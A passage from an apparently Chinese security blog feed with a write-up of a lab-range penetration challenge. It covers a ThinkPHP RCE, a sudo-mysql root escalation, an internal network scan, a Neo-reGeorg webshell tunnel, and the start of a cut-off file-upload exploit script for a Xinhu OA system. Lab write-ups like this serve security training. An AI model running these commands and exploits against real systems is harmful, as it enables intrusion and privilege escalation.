<br>/admin/files/manageinfo.php<br>/admin/files/newlink.php<br>/admin/files/reply.php<br>/admin/files/seniorset.php<br>/admin/files/seniorset.php<br>/admin/files/siteset.php<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜-Initial</title>
    <link href="/2024/10/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/"/>
    <url>/2024/10/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/</url>
    
    <content type="html"><![CDATA[<h1 id="春秋云镜-Initial"><a href="#春秋云镜-Initial" class="headerlink" title="春秋云镜-Initial"></a>春秋云镜-Initial</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>打开网站，发现是个xx管理系统页面</p><p>用fscan扫一下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> D:\tools\fscan&gt; ./fscan <span class="hljs-literal">-h</span> <span class="hljs-number">39.101</span>.<span class="hljs-number">204.146</span><br><br>   ___                              _<br>  / _ \     ___  ___ _ __ __ _  ___| | __<br> / /_\/____/ __|/ __| <span class="hljs-string">&#x27;__/ _` |/ __| |/ /</span><br><span class="hljs-string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="hljs-string">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="hljs-string">                     fscan version: 1.8.4</span><br><span class="hljs-string">start infoscan</span><br><span class="hljs-string">39.101.204.146:22 open</span><br><span class="hljs-string">39.101.204.146:80 open</span><br><span class="hljs-string">[*] alive ports len is: 2</span><br><span class="hljs-string">start vulscan</span><br><span class="hljs-string">[*] WebTitle http://39.101.204.146     code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="hljs-string">[+] PocScan http://39.101.204.146 poc-yaml-thinkphp5023-method-rce poc1</span><br><span class="hljs-string">已完成 2/2</span><br><span class="hljs-string">[*] 扫描结束,耗时: 27.0242366s</span><br></code></pre></td></tr></table></figure><p>扫到个thinkphp的RCE</p><p>用<a href="https://github.com/Lotus6/ThinkphpGUI">工具</a>getshell</p><p>然后蚁剑连接</p><p>在根目录中没有找到flag</p><p>root目录权限不够进不去，flag可能在这里</p><p>于是尝试提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l       #列出当前用户可以使用 sudo 执行的命令<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">(www-data:/var/www/html) $ sudo -l<br>Matching Defaults entries for www-data on ubuntu-web01:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br>User www-data may run the following commands on ubuntu-web01:<br>    (root) NOPASSWD: /usr/bin/mysql<br></code></pre></td></tr></table></figure><p>注意最后一行<code>(root) NOPASSWD: /usr/bin/mysql</code>，这说明我们可以通过<code>sudo</code>无需密码运行 <code>/usr/bin/mysql</code></p><p>利用<code>mysql</code>提权，参考<a href="https://blog.csdn.net/Bossfrank/article/details/132035121">渗透测试：Linux提权精讲（三）之sudo方法第三期</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo mysql -e &#x27;\! /bin/sh&#x27;      #启动一个具有root权限的shell会话<br></code></pre></td></tr></table></figure><p>由于蚁剑的终端是不完整的，并不是真正意义上的交互式shell，无法启动shell会话，所以执行上述语句不会有任何效果。</p><p>但我们可以将<code>/bin/sh</code>替换为我们想要执行的命令，在root目录中找到flag：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">(www-data:/var/www/html) $ sudo mysql -e &#x27;\! ls /root&#x27;<br>flag<br>(www-data:/var/www/html) $ sudo mysql -e &#x27;\! ls /root/flag&#x27;<br>flag01.txt<br>(www-data:/var/www/html) $ sudo mysql -e &#x27;\! cat /root/flag/flag01.txt&#x27;<br> ██     ██ ██     ██       ███████   ███████       ██     ████     ██   ████████ <br>░░██   ██ ░██    ████     ██░░░░░██ ░██░░░░██     ████   ░██░██   ░██  ██░░░░░░██<br> ░░██ ██  ░██   ██░░██   ██     ░░██░██   ░██    ██░░██  ░██░░██  ░██ ██      ░░ <br>  ░░███   ░██  ██  ░░██ ░██      ░██░███████    ██  ░░██ ░██ ░░██ ░██░██         <br>   ██░██  ░██ ██████████░██      ░██░██░░░██   ██████████░██  ░░██░██░██    █████<br>  ██ ░░██ ░██░██░░░░░░██░░██     ██ ░██  ░░██ ░██░░░░░░██░██   ░░████░░██  ░░░░██<br> ██   ░░██░██░██     ░██ ░░███████  ░██   ░░██░██     ░██░██    ░░███ ░░████████ <br>░░     ░░ ░░ ░░      ░░   ░░░░░░░   ░░     ░░ ░░      ░░ ░░      ░░░   ░░░░░░░░  <br>Congratulations!!! You found the first flag, the next flag may be in a server in the internal network.<br>flag01: flag&#123;60b53231-<br></code></pre></td></tr></table></figure><h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><p>接下来就要打内网了</p><p>先<code>ip a</code>看看ip:</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pf">(www-data:/var/www/html) $ ip a<br><span class="hljs-number">1</span>: lo: <span class="hljs-variable">&lt;LOOPBACK,UP,LOWER_UP&gt;</span> mtu <span class="hljs-number">65536</span> qdisc noqueue <span class="hljs-keyword">state</span> UNKNOWN <span class="hljs-keyword">group</span> <span class="hljs-keyword">default</span> qlen <span class="hljs-number">1000</span><br>    link/loopback <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> brd <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>    <span class="hljs-keyword">inet</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/<span class="hljs-number">8</span> scope host lo<br>       valid_lft forever preferred_lft forever<br>    <span class="hljs-keyword">inet6</span> ::<span class="hljs-number">1</span>/<span class="hljs-number">128</span> scope host <br>       valid_lft forever preferred_lft forever<br><span class="hljs-number">2</span>: eth0: <span class="hljs-variable">&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</span> mtu <span class="hljs-number">1500</span> qdisc mq <span class="hljs-keyword">state</span> UP <span class="hljs-keyword">group</span> <span class="hljs-keyword">default</span> qlen <span class="hljs-number">1000</span><br>    link/ether <span class="hljs-number">00</span>:<span class="hljs-number">16</span>:<span class="hljs-number">3</span>e:<span class="hljs-number">13</span>:a1:a9 brd ff:ff:ff:ff:ff:ff<br>    <span class="hljs-keyword">inet</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">1.15</span>/<span class="hljs-number">16</span> brd <span class="hljs-number">172.22</span>.<span class="hljs-number">255.255</span> scope <span class="hljs-keyword">global</span> dynamic eth0<br>       valid_lft <span class="hljs-number">315359388</span>sec preferred_lft <span class="hljs-number">315359388</span>sec<br>    <span class="hljs-keyword">inet6</span> fe80::<span class="hljs-number">216</span>:<span class="hljs-number">3</span>eff:fe13:a1a9/<span class="hljs-number">64</span> scope link <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure><p>ip为<code>172.22.1.15</code></p><p>然后用蚁剑上传fscan扫描内网</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod +x fscan     #给fscan添加可执行权限<br>./fscan -h 172.22.1.0/24    #扫描从172.22.1.0到172.22.1.255的所有IP地址<br></code></pre></td></tr></table></figure><p>扫描结果默认保存在result.txt中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#result.txt</span><br>172.22.1.15:22 open<br>172.22.1.18:3306 open<br>172.22.1.21:445 open<br>172.22.1.18:445 open<br>172.22.1.2:445 open<br>172.22.1.21:139 open<br>172.22.1.18:139 open<br>172.22.1.21:135 open<br>172.22.1.2:139 open<br>172.22.1.18:135 open<br>172.22.1.18:80 open<br>172.22.1.15:80 open<br>172.22.1.2:135 open<br>172.22.1.2:88 open<br>[*] NetInfo <br>[*]172.22.1.18<br>   [-&gt;]XIAORANG-OA01<br>   [-&gt;]172.22.1.18<br>[*] NetInfo <br>[*]172.22.1.21<br>   [-&gt;]XIAORANG-WIN7<br>   [-&gt;]172.22.1.21<br>[*] NetInfo <br>[*]172.22.1.2<br>   [-&gt;]DC01<br>   [-&gt;]172.22.1.2<br>[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin<br>[+] MS17-010 172.22.1.21(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)<br>[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393<br>[*] OsInfo 172.22.1.2(Windows Server 2016 Datacenter 14393)<br>[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600<br>[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1<br>[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login<br>[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统<br>[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1<br></code></pre></td></tr></table></figure><p>得出如下信息：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.1.2</span>   DC域控制器<br><span class="hljs-number">172.22.1.21</span>  MS17-<span class="hljs-number">010</span>永恒之蓝<br><span class="hljs-number">172.22.1.18</span>  信呼OA系统<br></code></pre></td></tr></table></figure><p>我们需要内网穿透才能对这些内网ip进行操作</p><p>我使用的是<a href="https://github.com/L-codes/Neo-reGeorg">Neo-reGeorg</a>这款内网渗透工具</p><p>与frp相比Neo-reGeorg不需要公网ip</p><p>先生成Neo-reGeorg的webshell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> D:\tools\Neo<span class="hljs-literal">-reGeorg-5</span>.<span class="hljs-number">2.0</span>&gt; python neoreg.py generate <span class="hljs-literal">-k</span> password     <span class="hljs-comment">#password为用于连接认证的自定义的密码</span><br><br><br>          <span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;&#x27;  &#x27;M<span class="hljs-variable">$</span>  &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>@m</span><br><span class="hljs-string">        :<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;&#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;</span><br><span class="hljs-string">       &#x27;<span class="hljs-variable">$</span>&#x27;    &#x27;JZI&#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span>&amp;  <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;</span><br><span class="hljs-string">                 &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>  &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span></span><br><span class="hljs-string">                 <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>  J<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;</span><br><span class="hljs-string">                m<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>  <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>,</span><br><span class="hljs-string">                <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>@  &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$_</span>          Neo-reGeorg</span><br><span class="hljs-string">             &#x27;1t<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27; &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&lt;</span><br><span class="hljs-string">          &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;  <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>          version 5.2.0</span><br><span class="hljs-string">               &#x27;@<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;  <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;</span><br><span class="hljs-string">                &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>  &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>@</span><br><span class="hljs-string">             &#x27;z<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>  @<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span></span><br><span class="hljs-string">                r<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>   <span class="hljs-variable">$</span><span class="hljs-variable">$</span>|</span><br><span class="hljs-string">                &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$v</span> c<span class="hljs-variable">$</span><span class="hljs-variable">$</span></span><br><span class="hljs-string">               &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$v</span> <span class="hljs-variable">$</span><span class="hljs-variable">$v</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>#</span><br><span class="hljs-string">               <span class="hljs-variable">$</span><span class="hljs-variable">$x</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$twelve</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>@<span class="hljs-variable">$</span>&#x27;</span><br><span class="hljs-string">             @<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>@L &#x27;    &#x27;&lt;@<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>`</span><br><span class="hljs-string">           <span class="hljs-variable">$</span><span class="hljs-variable">$</span>                 &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">    [ Github ] https://github.com/L-codes/Neo-reGeorg</span><br><span class="hljs-string"></span><br><span class="hljs-string">    [+] Mkdir a directory: neoreg_servers</span><br><span class="hljs-string">    [+] Create neoreg server files:</span><br><span class="hljs-string">       =&gt; neoreg_servers/tunnel.ashx</span><br><span class="hljs-string">       =&gt; neoreg_servers/tunnel.aspx</span><br><span class="hljs-string">       =&gt; neoreg_servers/tunnel.go</span><br><span class="hljs-string">       =&gt; neoreg_servers/tunnel.jsp</span><br><span class="hljs-string">       =&gt; neoreg_servers/tunnel.jspx</span><br><span class="hljs-string">       =&gt; neoreg_servers/tunnel.php</span><br><span class="hljs-string">       </span><br></code></pre></td></tr></table></figure><p>在neoreg_servers文件夹中生成了各种语言的webshell</p><p>由于靶机使用的是php，我们只需将<code>tunnel.php</code>上传到靶机上的web服务目录（<code>/var/www/html</code>）</p><p>然后在本机执行命令进行连接：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">python neoreg.py <span class="hljs-literal">-k</span> password <span class="hljs-literal">-u</span> http://xx/tunnel.php   <br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Users\Hesyer\Desktop\道具\Neo<span class="hljs-literal">-reGeorg-5</span>.<span class="hljs-number">2.0</span>&gt; python neoreg.py <span class="hljs-literal">-k</span> password <span class="hljs-literal">-u</span> http://<span class="hljs-number">39.98</span>.<span class="hljs-number">117.52</span>/tunnel.php<br><br><br>          <span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;&#x27;  &#x27;M<span class="hljs-variable">$</span>  &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>@m</span><br><span class="hljs-string">        :<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;&#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;</span><br><span class="hljs-string">       &#x27;<span class="hljs-variable">$</span>&#x27;    &#x27;JZI&#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span>&amp;  <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;</span><br><span class="hljs-string">                 &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>  &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span></span><br><span class="hljs-string">                 <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>  J<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;</span><br><span class="hljs-string">                m<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>  <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>,</span><br><span class="hljs-string">                <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>@  &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$_</span>          Neo-reGeorg</span><br><span class="hljs-string">             &#x27;1t<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27; &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&lt;</span><br><span class="hljs-string">          &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;  <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>          version 5.2.0</span><br><span class="hljs-string">               &#x27;@<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;  <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;</span><br><span class="hljs-string">                &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>  &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>@</span><br><span class="hljs-string">             &#x27;z<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>  @<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span></span><br><span class="hljs-string">                r<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>   <span class="hljs-variable">$</span><span class="hljs-variable">$</span>|</span><br><span class="hljs-string">                &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$v</span> c<span class="hljs-variable">$</span><span class="hljs-variable">$</span></span><br><span class="hljs-string">               &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$v</span> <span class="hljs-variable">$</span><span class="hljs-variable">$v</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>#</span><br><span class="hljs-string">               <span class="hljs-variable">$</span><span class="hljs-variable">$x</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$twelve</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>@<span class="hljs-variable">$</span>&#x27;</span><br><span class="hljs-string">             @<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>@L &#x27;    &#x27;&lt;@<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>`</span><br><span class="hljs-string">           <span class="hljs-variable">$</span><span class="hljs-variable">$</span>                 &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">    [ Github ] https://github.com/L-codes/Neo-reGeorg</span><br><span class="hljs-string"></span><br><span class="hljs-string">+------------------------------------------------------------------------+</span><br><span class="hljs-string">  Log Level set to [ERROR]</span><br><span class="hljs-string">  Starting SOCKS5 server [127.0.0.1:1080]</span><br><span class="hljs-string">  Tunnel at:</span><br><span class="hljs-string">    http://39.98.117.52/tunnel.php</span><br><span class="hljs-string">+------------------------------------------------------------------------+</span><br></code></pre></td></tr></table></figure><p>在代理工具proxifier上配置 socks5 代理即可</p><p>现在，我们可以访问上述内网ip了</p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>访问之前fscan扫描到的信呼协同办公系统<code>172.22.1.18</code></p><p>可以看到版本为2.2.8</p><p>搜索可知该版本存在文件上传漏洞，获取exp并利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#需要在同目录下放置一个名为&quot;1.php&quot;的php一句话木马</span><br><span class="hljs-keyword">import</span> requests<br><br><br>session = requests.session()<br><br>url_pre = <span class="hljs-string">&#x27;http://172.22.1.18/&#x27;</span><br>url1 = url_pre + <span class="hljs-string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span><br>url2 = url_pre + <span class="hljs-string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span><br>url3 = url_pre + <span 